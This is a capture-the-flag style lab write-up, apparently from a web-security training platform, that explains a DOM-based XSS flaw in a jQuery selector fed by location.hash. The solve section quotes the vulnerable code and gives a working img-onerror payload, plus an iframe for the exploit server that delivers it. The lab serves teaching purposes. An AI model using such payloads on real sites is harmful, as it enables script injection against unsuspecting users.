## 6 - DOM XSS in jQuery selector sink using hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

## Notes

- Possibility to leave a comment on a post
- Exploit server
- `/resources/js/jqueryMigrate_1-4-1.js`
- `/resources/js/jquery_1-8-2.js`

## Resume

1. Find the js script on home page
2. Triger the XSS
3. Send payload using exploit server

## Solve

```js
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
         if (post) post.get(0).scrollIntoView();
     });
</script>
```

This jQuery code attaches a hashchange event listener to the window. When the URL hash changes (e.g., #My Post Title), it extracts the hash value after #, decodes it with decodeURIComponent, and selects the first <h2> inside section.blog-list containing that exact text using the :contains() selector.

If found, it scrolls the page smoothly to that <h2> element via scrollIntoView(). This enables anchor-like navigation to blog post titles without full page reloads.

We can use the following payload to call a `print()` :

```js
/#<img src=x onerror=print()>
```

And on exploit server : 

```js
<iframe src="https://0a8700e5038d70188083125700060069.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```